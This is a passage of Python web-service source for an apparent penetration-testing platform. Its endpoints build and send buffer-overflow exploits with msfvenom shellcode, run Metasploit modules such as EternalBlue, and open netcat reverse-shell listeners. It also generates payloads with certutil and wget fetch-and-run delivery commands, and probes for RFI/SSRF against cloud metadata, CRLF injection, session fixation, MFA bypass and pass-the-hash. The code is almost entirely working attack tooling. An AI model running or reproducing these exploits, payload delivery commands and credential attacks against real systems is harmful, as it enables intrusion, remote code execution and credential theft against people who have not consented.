    raw_bytes = "".join(raw)
    size_m = re.search(r"Payload size:\s*(\d+) bytes", out)
    size = int(size_m.group(1)) if size_m else None
    if not raw_bytes:
        return {"error": "msfvenom produced no shellcode — check LHOST/payload/bad chars",
                "raw_output": out[:500]}
    return {"payload":req.payload_type,"lhost":req.lhost,"lport":req.lport,
            "bad_chars":bad_bytes,"size":size,"shellcode_python":shellcode_py,
            "shellcode_bytes":raw_bytes,"message":f"✅ Shellcode {size} bytes → {req.lhost}:{req.lport}"}


@app.post("/api/bof/exploit")
async def bof_exploit(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset: return {"error":"Offset required"}
    if not req.jmp_esp: return {"error":"JMP ESP address required"}
    if not req.shellcode: return {"error":"Shellcode required"}

    # Ensure ASLR is off — libc gadgets are only stable with ASLR=0
    try:
        with open("/proc/sys/kernel/randomize_va_space", "w") as _f:
            _f.write("0\n")
    except Exception:
        pass

    host, port = _bof_parse_target(req.target)
    binary = (req.binary_path or "").strip()
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    try:
        addr_int = int(req.jmp_esp.strip().lower().replace("0x",""), 16)
    except ValueError:
        return {"error": f"Invalid JMP ESP address: {req.jmp_esp}"}
    retn = _struct.pack("<I", addr_int)
    # Parse shellcode — handles both \xNN text format and raw bytes
    hex_bytes = re.findall(r'\\x([0-9a-fA-F]{2})', req.shellcode)
    if not hex_bytes:
        hex_bytes = re.findall(r'(?<![0-9a-fA-F])([0-9a-fA-F]{2})(?![0-9a-fA-F])', req.shellcode)
    sc = bytes([int(h, 16) for h in hex_bytes])
    if not sc: return {"error": "Could not parse shellcode — re-run Phase 6"}
    nop_sled = b"\x90" * 32
    payload = prefix + b"A" * req.offset + retn + nop_sled + sc
    _bof_send(host, port, payload, timeout=6)
    return {"sent": True, "payload_size": len(payload), "offset": req.offset,
            "retn": req.jmp_esp, "shellcode_size": len(sc),
            "message": f"✅ Exploit sent — {len(payload)} bytes (offset={req.offset}, nop_sled=32, sc={len(sc)})"}


# ── INTEGRATED SHELL LISTENER (nc-backed) ────────────────────
class _ShellSession:
    def __init__(self, lid, lport):
        self.lid    = lid
        self.lport  = lport
        self.output = []
        self.status = "waiting"   # waiting | connected | closed
        self.proc   = None        # asyncio subprocess (nc)

SHELL_SESSIONS: dict = {}

@app.post("/api/bof/shell/start")
async def bof_shell_start(req: BOFRequest, user=Depends(verify_token)):
    lport = req.lport or 4444
    lid   = f"shell_{lport}"
    # Kill old session
    old = SHELL_SESSIONS.pop(lid, None)
    if old and old.proc:
        try: old.proc.kill()
        except: pass
    # Free the port
    subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
    subprocess.run(["pkill", "-f", f"nc.*{lport}"], capture_output=True)
    await asyncio.sleep(0.6)

    session = _ShellSession(lid, lport)
    SHELL_SESSIONS[lid] = session

    try:
        proc = await asyncio.create_subprocess_exec(
            "nc", "-lvnp", str(lport),
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        session.proc = proc

        async def _read_nc():
            session.output.append(f"[*] nc listener on 0.0.0.0:{lport}\n")
            while True:
                try:
                    chunk = await asyncio.wait_for(proc.stdout.read(4096), timeout=300)
                    if not chunk:
                        break
                    decoded = chunk.decode("utf-8", errors="replace")
                    session.output.append(decoded)
                    # Detect first data → shell connected
                    if session.status == "waiting" and decoded.strip():
                        session.status = "connected"
                        session.output.append("[+] Shell connected!\n")
                except asyncio.TimeoutError:
                    break
                except Exception:
                    break
            session.status = "closed"

        asyncio.create_task(_read_nc())
        return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
                "message": f"nc listener ready on port {lport}"}
    except Exception as e:
        return {"error": str(e), "lid": lid, "ok": False}

@app.get("/api/bof/shell/{lid}/output")
async def bof_shell_output(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s: return {"output": "", "status": "not_found"}
    out = "".join(s.output); s.output = []
    return {"output": out, "status": s.status}

@app.post("/api/bof/shell/{lid}/cmd")
async def bof_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s or not s.proc or not s.proc.stdin:
        return {"error": "No shell connected"}
    try:
        cmd = body.get("cmd", "")
        s.proc.stdin.write((cmd + "\n").encode())
        await s.proc.stdin.drain()
        return {"sent": True}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/bof/shell/{lid}/stop")
async def bof_shell_stop(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.pop(lid, None)
    if s and s.proc:
        try: s.proc.kill()
        except: pass
    return {"stopped": True}


# ══════════════════════════════════════════════════════════════
#  EXPLOITATION TECHNIQUES MODULE
#  7 endpoints — searchsploit, vuln check, MSF, payload, shell
# ══════════════════════════════════════════════════════════════

import socket as _esock

class ExploitRequest(BaseModel):
    target:         str
    port:           int  = 445
    msf_module:     str  = ""
    msf_payload:    str  = "windows/x64/shell_reverse_tcp"
    lhost:          str  = ""
    lport:          int  = 4444
    query:          str  = ""
    payload_format: str  = "exe"
    extra_opts:     str  = ""


def _exp_host(target: str) -> str:
    t = target.strip().replace("http://","").replace("https://","").split("/")[0]
    return t.split(":")[0]


@app.post("/api/exploit/search")
async def exploit_search(req: ExploitRequest, user=Depends(verify_token)):
    q = (req.query or req.target).strip()
    result = await run_tool(["searchsploit", "--json", q], timeout=30)
    raw = result.get("output", "")
    exploits = []
    try:
        data = json.loads(raw)
        for e in data.get("RESULTS_EXPLOIT", []):
            exploits.append({
                "title":    e.get("Title", ""),
                "edb_id":   e.get("EDB-ID", ""),
                "type":     e.get("Type", ""),
                "platform": e.get("Platform", ""),
                "path":     e.get("Path", ""),
                "date":     e.get("Date", ""),
            })
    except Exception:
        for line in raw.splitlines():
            if "|" in line and "EDB-ID" not in line and "---" not in line:
                parts = [p.strip() for p in line.split("|")]
                if len(parts) >= 2:
                    exploits.append({"title": parts[0], "path": parts[-1] if len(parts)>2 else "", "type": "", "platform": "", "edb_id": "", "date": ""})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "exploit_search", req.target, result)
    return {"scan_id": scan_id, "query": q, "exploits": exploits, "total": len(exploits), "raw_output": raw, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/exploit/vulncheck")
async def exploit_vulncheck(req: ExploitRequest, user=Depends(verify_token)):
    host = _exp_host(req.target)
    result = await run_tool(["nmap", "--script", "vuln", "-T4", "-p", str(req.port), host], timeout=180)
    out = result.get("output", "")
    vulns = []
    current_port = None
    for line in out.splitlines():
        pm = re.match(r"(\d+)/tcp\s+open", line)
        if pm: current_port = pm.group(1)
        vm = re.match(r"\|\s*(CVE-\d{4}-\d+|VULNERABLE|vuln\S+).*", line, re.I)
        if vm and current_port:
            vulns.append({"port": current_port, "detail": line.strip()})
        if "VULNERABLE" in line or "State: VULNERABLE" in line:
            vulns.append({"port": current_port or req.port, "detail": line.strip()})
    vulns = [v for v in vulns if v["detail"] and len(v["detail"]) > 3]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "vulncheck", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "port": req.port, "vulns": vulns, "total": len(vulns), "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/exploit/msf")
async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
    if not req.msf_module:
        return {"error": "MSF module required — e.g. exploit/windows/smb/ms17_010_eternalblue"}
    if not req.lhost:
        return {"error": "LHOST required (your Kali IP)"}
    host = _exp_host(req.target)
    extra = ""
    if req.extra_opts.strip():
        extra = "; ".join(f"set {o.strip()}" for o in req.extra_opts.strip().split(";") if o.strip())
        extra = "; " + extra
    cmds = (
        f"use {req.msf_module}; "
        f"set RHOSTS {host}; "
        f"set RPORT {req.port}; "
        f"set LHOST {req.lhost}; "
        f"set LPORT {req.lport}; "
        f"set PAYLOAD {req.msf_payload}; "
        f"set ExitOnSession false{extra}; "
        f"exploit -j; "
        f"sleep 15; "
        f"sessions -l; "
        f"exit -y"
    )
    result = await run_tool(["msfconsole", "-q", "--no-readline", "-x", cmds], timeout=120)
    out = result.get("output", "")
    session_opened = bool(re.search(r"Meterpreter session \d+ opened|Command shell session \d+ opened|session \d+ created", out, re.I))
    session_id = None
    sm = re.search(r"session (\d+) (opened|created)", out, re.I)
    if sm: session_id = sm.group(1)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "msf_exploit", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "port": req.port, "module": req.msf_module, "payload": req.msf_payload, "lhost": req.lhost, "lport": req.lport, "session_opened": session_opened, "session_id": session_id, "raw_output": out, "message": f"Session opened (id={session_id})" if session_opened else "No session opened — check target is running and reachable", "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/exploit/payload")
async def exploit_payload(req: ExploitRequest, user=Depends(verify_token)):
    if not req.lhost:
        return {"error": "LHOST required (your Kali IP)"}
    fmt_ext = {"exe": "exe", "elf": "elf", "php": "php", "py": "py", "raw": "bin", "jar": "jar", "asp": "asp", "aspx": "aspx", "ps1": "ps1"}
    ext = fmt_ext.get(req.payload_format, req.payload_format)
    out_file = f"/tmp/payload_{uuid.uuid4().hex}.{ext}"
    cmd = ["msfvenom", "-p", req.msf_payload, f"LHOST={req.lhost}", f"LPORT={req.lport}", "EXITFUNC=thread", "-f", req.payload_format, "-o", out_file]
    result = await run_tool(cmd, timeout=60)
    out = result.get("output", "")
    size_m = re.search(r"Payload size:\s*(\d+) bytes", out)
    size = int(size_m.group(1)) if size_m else None
    try:
        disk_size = os.path.getsize(out_file)
    except Exception:
        disk_size = size
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "payload_gen", req.target, result)
    delivery = {
        "exe": f"# Transfer to Windows target:\npython3 -m http.server 80\n# On target: certutil -urlcache -f http://{req.lhost}/payload.exe payload.exe && payload.exe",
        "elf": f"# Transfer to Linux target:\npython3 -m http.server 80\n# On target: wget http://{req.lhost}/payload.elf -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell",
        "php": f"# Upload to vulnerable web app:\n# Then browse to http://TARGET/uploads/shell.php",
        "py":  f"# Run on target:\npython3 payload.py",
    }.get(req.payload_format, f"Transfer {out_file} to target and execute")
    return {"scan_id": scan_id, "payload": req.msf_payload, "format": req.payload_format, "lhost": req.lhost, "lport": req.lport, "output_file": out_file, "size": disk_size, "size_bytes": size, "delivery": delivery, "listener_cmd": f"nc -lvnp {req.lport}", "raw_output": out, "message": f"Payload saved to {out_file} ({disk_size} bytes)" if disk_size else out, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/exploit/shell/start")
async def exploit_shell_start(req: ExploitRequest, user=Depends(verify_token)):
    lport = req.lport or 4444
    lid   = f"exploit_shell_{lport}"
    old = SHELL_SESSIONS.pop(lid, None)
    if old and old.proc:
        try: old.proc.kill()
        except: pass
    subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
    subprocess.run(["pkill", "-f", f"nc.*{lport}"], capture_output=True)
    await asyncio.sleep(0.6)
    session = _ShellSession(lid, lport)
    SHELL_SESSIONS[lid] = session
    try:
        proc = await asyncio.create_subprocess_exec(
            "nc", "-lvnp", str(lport),
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        session.proc = proc

        async def _read_exploit_nc():
            session.output.append(f"[*] nc listener on 0.0.0.0:{lport}\n")
            while True:
                try:
                    chunk = await asyncio.wait_for(proc.stdout.read(4096), timeout=300)
                    if not chunk:
                        break
                    decoded = chunk.decode("utf-8", errors="replace")
                    session.output.append(decoded)
                    if session.status == "waiting" and decoded.strip():
                        session.status = "connected"
                        session.output.append("[+] Shell connected!\n")
                except asyncio.TimeoutError:
                    break
                except Exception:
                    break
            session.status = "closed"

        asyncio.create_task(_read_exploit_nc())
        return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
                "message": f"nc listener ready on port {lport}"}
    except Exception as e:
        return {"error": str(e), "lid": lid, "ok": False}

@app.get("/api/exploit/shell/{lid}/output")
async def exploit_shell_output(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s: return {"output": "", "status": "not_found"}
    out = "".join(s.output); s.output = []
    return {"output": out, "status": s.status}

@app.post("/api/exploit/shell/{lid}/cmd")
async def exploit_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s or not s.proc or not s.proc.stdin:
        return {"error": "No shell connected"}
    try:
        cmd = body.get("cmd", "")
        s.proc.stdin.write((cmd + "\n").encode())
        await s.proc.stdin.drain()
        return {"sent": True}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/exploit/shell/{lid}/stop")
async def exploit_shell_stop(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.pop(lid, None)
    if s and s.proc:
        try: s.proc.kill()
        except: pass
    return {"stopped": True}


# ══════════════════════════════════════════════════════════════
#  PROMPT 1 — MISSING WEB APP ATTACKS
#  RFI, Insecure Deserialization, HTTP Smuggling,
#  HTTP Response Splitting, Session Fixation
# ══════════════════════════════════════════════════════════════

@app.post("/api/scan/rfi")
async def scan_rfi(req: ScanRequest, user=Depends(verify_token)):
    payloads = [
        "?file=http://169.254.169.254/latest/meta-data/",
        "?page=http://169.254.169.254/",
        "?include=http://169.254.169.254/",
        "?path=http://169.254.169.254/",
        "?doc=http://169.254.169.254/",
    ]
    findings = []
    for payload in payloads:
        sep = "&" if "?" in req.target else ""
        test_url = req.target + payload if "?" not in req.target else req.target + "&" + payload.lstrip("?")
        try:
            r = _req_lib.get(test_url, timeout=8, verify=False, allow_redirects=True)
            indicators = ["ami-id", "instance-id", "local-ipv4", "metadata", "security-credentials"]
            for ind in indicators:
                if ind in r.text.lower():
                    findings.append({
                        "detail": f"RFI/SSRF confirmed via {payload} — metadata leak: {ind}",
                        "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                        "cwe": "CWE-98", "cwe_name": "Remote File Inclusion",
                        "owasp": "A03:2021", "remediation": "Never use user-supplied input as file path. Use allowlists for permitted files."
                    })
                    break
        except: pass
    result = await run_tool(["curl", "-sk", "--max-time", "10",
        f"{req.target}?file=http://169.254.169.254/latest/meta-data/"], timeout=15)
    out = result.get("output", "")
    if "ami-id" in out or "instance-id" in out:
        findings.append({"detail": "RFI confirmed: AWS metadata exposed", "severity": "CRITICAL",
            "cvss": "9.8", "cve": "N/A", "cwe": "CWE-98", "cwe_name": "Remote File Inclusion",
            "owasp": "A03:2021", "remediation": "Validate and sanitise all file path inputs. Never include remote URLs."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "rfi", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "rfi",
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/deserial")
async def scan_deserial(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    try:
        r = _req_lib.get(req.target, timeout=10, verify=False, allow_redirects=True)
        headers = {k.lower(): v for k, v in r.headers.items()}
        cookies_raw = r.headers.get("Set-Cookie", "")
        # Java serialized object magic bytes (base64 encoded rO0)
        if "ro0" in r.text.lower() or "rO0AB" in r.text:
            findings.append({"detail": "Java serialized object detected in response (rO0 magic bytes)",
                "severity": "CRITICAL", "cvss": "9.8", "cve": "CVE-2015-4852",
                "cwe": "CWE-502", "cwe_name": "Insecure Deserialization",
                "owasp": "A08:2021", "remediation": "Never deserialize untrusted data. Use JSON/XML with strict schemas instead."})
        # PHP serialization patterns
        if re.search(r'O:\d+:"[A-Za-z]', r.text):
            findings.append({"detail": "PHP serialized object detected in response",
                "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                "cwe": "CWE-502", "cwe_name": "Insecure Deserialization",
                "owasp": "A08:2021", "remediation": "Use json_encode/json_decode instead of serialize/unserialize."})
        # Pickle in cookies
        if "pickle" in cookies_raw.lower() or "session" in cookies_raw.lower():
            for c in cookies_raw.split(";"):
                if re.search(r'[A-Za-z0-9+/]{40,}={0,2}', c.strip()):
                    findings.append({"detail": "Potentially serialized session cookie detected",
                        "severity": "HIGH", "cvss": "8.1", "cve": "N/A",
                        "cwe": "CWE-502", "cwe_name": "Insecure Deserialization",
                        "owasp": "A08:2021", "remediation": "Use signed, encrypted session tokens. Never use pickle for sessions."})
                    break
        # ViewState without MAC
        if "__VIEWSTATE" in r.text and "EnableViewStateMac" not in r.text:
            findings.append({"detail": "ASP.NET ViewState without MAC protection detected",
                "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                "cwe": "CWE-502", "cwe_name": "Insecure Deserialization",
                "owasp": "A08:2021", "remediation": "Enable ViewState MAC validation: <pages enableViewStateMac='true'/>"})
        if not findings:
            findings.append({"detail": "No obvious deserialization indicators found (manual review recommended)",
                "severity": "INFO", "cvss": "0.0", "cve": "N/A",
                "cwe": "CWE-502", "cwe_name": "Insecure Deserialization",
                "owasp": "A08:2021", "remediation": "Review all endpoints accepting serialized data."})
    except Exception as e:
        findings.append({"detail": f"Scan error: {e}", "severity": "INFO", "cvss": "0.0",
            "cve": "N/A", "cwe": "N/A", "cwe_name": "Scan Error", "owasp": "N/A",
            "remediation": "Check target accessibility."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "deserial", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "deserial",
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/smuggling")
async def scan_smuggling(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(
        ["python3", "/usr/share/smuggler/smuggler.py", "-u", req.target, "--no-color"],
        timeout=60)
    out = result.get("output", "")
    findings = []
    if "vulnerable" in out.lower() or "CL.TE" in out or "TE.CL" in out or "smuggl" in out.lower():
        vuln_type = "CL.TE" if "CL.TE" in out else "TE.CL" if "TE.CL" in out else "HTTP Request Smuggling"
        findings.append({"detail": f"HTTP Request Smuggling ({vuln_type}) detected",
            "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
            "cwe": "CWE-444", "cwe_name": "HTTP Request Smuggling",
            "owasp": "A01:2021",
            "remediation": "Disable HTTP/1.1 keep-alive. Use HTTP/2 end-to-end. Normalise Content-Length and Transfer-Encoding headers."})
    # Manual check via curl
    if not findings:
        try:
            r = _req_lib.post(req.target, timeout=10, verify=False,
                headers={"Transfer-Encoding": "chunked", "Content-Length": "6",
                         "Content-Type": "application/x-www-form-urlencoded"},
                data="0\r\n\r\nG")
            if r.status_code in [400, 500]:
                findings.append({"detail": "Server may be vulnerable to HTTP Request Smuggling (ambiguous framing response)",
                    "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                    "cwe": "CWE-444", "cwe_name": "HTTP Request Smuggling",
                    "owasp": "A01:2021",
                    "remediation": "Ensure front-end and back-end servers use consistent HTTP framing."})
        except: pass
    if not findings:
        findings.append({"detail": "No HTTP Request Smuggling detected (manual testing recommended)",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-444", "cwe_name": "HTTP Request Smuggling",
            "owasp": "A01:2021", "remediation": "Use Burp Suite HTTP Request Smuggler extension for deeper testing."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "smuggling", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "smuggler",
            "findings": findings, "total": len(findings), "raw_output": out,
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/responsesplitting")
async def scan_responsesplitting(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    crlf_payloads = [
        "%0d%0aX-Injected: header",
        "%0aX-Injected: header",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "\r\nX-Injected: header",
        "%E5%98%8A%E5%98%8DX-Injected: header",
    ]
    parsed = urlparse(req.target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    for payload in crlf_payloads:
        test_url = f"{req.target}?redirect={payload}"
        try:
            r = _req_lib.get(test_url, timeout=8, verify=False, allow_redirects=False)
            resp_headers = str(r.headers)
            if "x-injected" in resp_headers.lower():
                findings.append({"detail": f"CRLF/HTTP Response Splitting confirmed via: {payload[:40]}",
                    "severity": "HIGH", "cvss": "7.2", "cve": "N/A",
                    "cwe": "CWE-113", "cwe_name": "HTTP Response Splitting",
                    "owasp": "A03:2021",
                    "remediation": "Strip CR (\\r) and LF (\\n) from all user-supplied header values."})
                break
        except: pass
    if not findings:
        findings.append({"detail": "No CRLF/HTTP Response Splitting detected",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-113", "cwe_name": "HTTP Response Splitting",
            "owasp": "A03:2021", "remediation": "Sanitise all user input used in HTTP headers."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "responsesplitting", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "responsesplitting",
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/sessionfixation")
async def scan_sessionfixation(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    try:
        s = _req_lib.Session()
        r1 = s.get(req.target, timeout=10, verify=False, allow_redirects=True)
        pre_cookies = dict(s.cookies)
        # Try to inject a session ID
        session_keys = ["PHPSESSID", "JSESSIONID", "ASP.NET_SessionId", "session", "sid"]
        for key in session_keys:
            if key.lower() in [c.lower() for c in pre_cookies]:
                injected_id = "FIXEDID12345ATTACKER"
                r2 = s.get(req.target + f"?{key}={injected_id}", timeout=10, verify=False)
                post_cookies = dict(s.cookies)
                if injected_id in str(post_cookies.values()):
                    findings.append({"detail": f"Session Fixation: server accepted injected {key}={injected_id}",
                        "severity": "HIGH", "cvss": "8.0", "cve": "N/A",
                        "cwe": "CWE-384", "cwe_name": "Session Fixation",
                        "owasp": "A07:2021",
                        "remediation": "Regenerate session ID after login. Never accept session IDs from URL parameters."})
                    break
        # Check if session ID appears in URL
        if any(k in r1.url for k in ["PHPSESSID=", "jsessionid=", "sid="]):
            findings.append({"detail": "Session ID exposed in URL — vulnerable to session fixation and hijacking",
                "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                "cwe": "CWE-384", "cwe_name": "Session Fixation",
                "owasp": "A07:2021",
                "remediation": "Use cookies for session management only. Never pass session IDs in URLs."})
        if not pre_cookies:
            findings.append({"detail": "No session cookies found — application may not use sessions or login required",
                "severity": "INFO", "cvss": "0.0", "cve": "N/A",
                "cwe": "CWE-384", "cwe_name": "Session Fixation",
                "owasp": "A07:2021", "remediation": "Test on authenticated pages."})
        elif not findings:
            findings.append({"detail": "Session cookies present — no fixation indicators found (test after login)",
                "severity": "INFO", "cvss": "0.0", "cve": "N/A",
                "cwe": "CWE-384", "cwe_name": "Session Fixation",
                "owasp": "A07:2021", "remediation": "Verify session regeneration occurs after authentication."})
    except Exception as e:
        findings.append({"detail": f"Scan error: {e}", "severity": "INFO", "cvss": "0.0",
            "cve": "N/A", "cwe": "N/A", "cwe_name": "Scan Error",
            "owasp": "N/A", "remediation": "Check target accessibility."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "sessionfixation", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "sessionfixation",
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  PROMPT 2 — AUTH ATTACKS
#  MFA Bypass, Pass-the-Hash, Pass-the-Ticket, Keylog Detection
# ══════════════════════════════════════════════════════════════

class AuthRequest(BaseModel):
    target:   str
    username: str = "admin"
    password: str = ""
    hash:     str = ""
    domain:   str = "WORKGROUP"
    port:     int = 445

@app.post("/api/auth/mfabypass")
async def auth_mfabypass(req: AuthRequest, user=Depends(verify_token)):
    findings = []
    target_url = req.target if req.target.startswith("http") else "http://" + req.target
    try:
        s = _req_lib.Session()
        r = s.get(target_url, timeout=10, verify=False, allow_redirects=True)
        # Check for OTP/MFA fields
        has_mfa = bool(re.search(r'otp|mfa|totp|2fa|token|code|verify|authenticat', r.text, re.I))
        # Test 1: Direct access bypass
        protected = ["/admin", "/dashboard", "/account", "/profile", "/settings", "/api/user"]
        bypassed = []
        for path in protected:
            try:
                r2 = s.get(target_url.rstrip("/") + path, timeout=5, verify=False)
                if r2.status_code == 200 and len(r2.text) > 200:
                    bypassed.append(path)
            except: pass
        if bypassed:
            findings.append({"detail": f"MFA Bypass: protected paths accessible without authentication: {', '.join(bypassed)}",
                "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                "cwe": "CWE-287", "cwe_name": "MFA Bypass",
                "owasp": "A07:2021",
                "remediation": "Enforce MFA check server-side on every request to protected resources."})
        # Test 2: Check for OTP reuse / no rate limiting
        if has_mfa:
            findings.append({"detail": "MFA/OTP fields detected — test for: OTP reuse, no rate-limit, response manipulation",
                "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                "cwe": "CWE-287", "cwe_name": "MFA Bypass",
                "owasp": "A07:2021",
                "remediation": "Implement OTP expiry (30s), rate-limit attempts, invalidate OTP after use."})
        # Test 3: X-Forwarded headers bypass
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
        ]
        for hdrs in bypass_headers:
            try:
                r3 = _req_lib.get(target_url, headers=hdrs, timeout=5, verify=False)
                if r3.status_code == 200 and "admin" in r3.text.lower():
                    findings.append({"detail": f"Auth bypass via header: {list(hdrs.keys())[0]}",
                        "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                        "cwe": "CWE-287", "cwe_name": "Auth Bypass",
                        "owasp": "A07:2021",
                        "remediation": "Never trust X-Forwarded-For or similar headers for access control decisions."})
            except: pass
        if not findings:
            findings.append({"detail": "No obvious MFA bypass detected — manual testing with valid credentials recommended",
                "severity": "INFO", "cvss": "0.0", "cve": "N/A",
                "cwe": "CWE-287", "cwe_name": "MFA Bypass",
                "owasp": "A07:2021", "remediation": "Test response manipulation: change MFA response from false to true."})
    except Exception as e:
        findings.append({"detail": f"Scan error: {e}", "severity": "INFO", "cvss": "0.0",
            "cve": "N/A", "cwe": "N/A", "cwe_name": "Scan Error",
            "owasp": "N/A", "remediation": "Check target."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "mfabypass", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "mfabypass",
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/auth/pth")
async def auth_pth(req: AuthRequest, user=Depends(verify_token)):
    if not req.hash:
        return {"error": "NTLM hash required (format: LM:NT or just NT hash)"}
    host = _recon_host(req.target)
    findings = []
    # Try crackmapexec
    cme_result = await run_tool(
        ["crackmapexec", "smb", host, "-u", req.username, "-H", req.hash, "--no-bruteforce"],
        timeout=30)
    out = cme_result.get("output", "")
    if "[+]" in out and ("Pwn3d" in out or "STATUS_SUCCESS" in out.upper()):
        findings.append({"detail": f"Pass-the-Hash SUCCESS: {req.username} authenticated with hash on {host}",
            "severity": "CRITICAL", "cvss": "9.0", "cve": "N/A",
            "cwe": "CWE-294", "cwe_name": "Pass-the-Hash",
            "owasp": "A07:2021",
            "remediation": "Enable Protected Users security group. Disable NTLM. Use Kerberos only. Enable Credential Guard."})
    elif "[+]" in out:
        findings.append({"detail": f"Pass-the-Hash: authenticated as {req.username} (no admin)",
            "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
            "cwe": "CWE-294", "cwe_name": "Pass-the-Hash",
            "owasp": "A07:2021",
            "remediation": "Enable NTLM blocking. Use Windows Defender Credential Guard."})
    # Also try impacket smbclient
    imp_result = await run_tool(
        ["python3", "-c",
         f"from impacket.smbconnection import SMBConnection; s=SMBConnection('{host}','{host}'); s.login('{req.username}','','{req.domain}',nthash='{req.hash.split(':')[-1]}'); print('LOGIN_OK')"],
        timeout=20)
    imp_out = imp_result.get("output", "")
    if "LOGIN_OK" in imp_out:
        findings.append({"detail": f"Pass-the-Hash via impacket: {req.username}@{host} authenticated",
            "severity": "CRITICAL", "cvss": "9.0", "cve": "N/A",
            "cwe": "CWE-294", "cwe_name": "Pass-the-Hash",
            "owasp": "A07:2021",
            "remediation": "Rotate all credentials. Enable Credential Guard. Implement tiered admin model."})
    if not findings:
        findings.append({"detail": "Pass-the-Hash failed — hash may be invalid or target patched",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-294", "cwe_name": "Pass-the-Hash",
            "owasp": "A07:2021", "remediation": "Verify hash format: LMHASH:NTHASH"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "pth", req.target, cme_result)
    return {"scan_id": scan_id, "target": req.target, "tool": "crackmapexec",
            "findings": findings, "total": len(findings),
            "raw_output": out, "command": cme_result.get("cmd", ""),
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/auth/ptt")
async def auth_ptt(req: AuthRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    findings = []
    # Check if Kerberos port is open
    sock_result = await run_tool(["nmap", "-sV", "-p", "88,389,636", host, "-T4"], timeout=30)
    nmap_out = sock_result.get("output", "")
    kerberos_open = "88/tcp" in nmap_out and "open" in nmap_out
    ldap_open = "389/tcp" in nmap_out and "open" in nmap_out
    if kerberos_open:
        findings.append({"detail": f"Kerberos (port 88) open on {host} — target is a Domain Controller",
            "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
            "cwe": "CWE-294", "cwe_name": "Pass-the-Ticket",
            "owasp": "A07:2021",
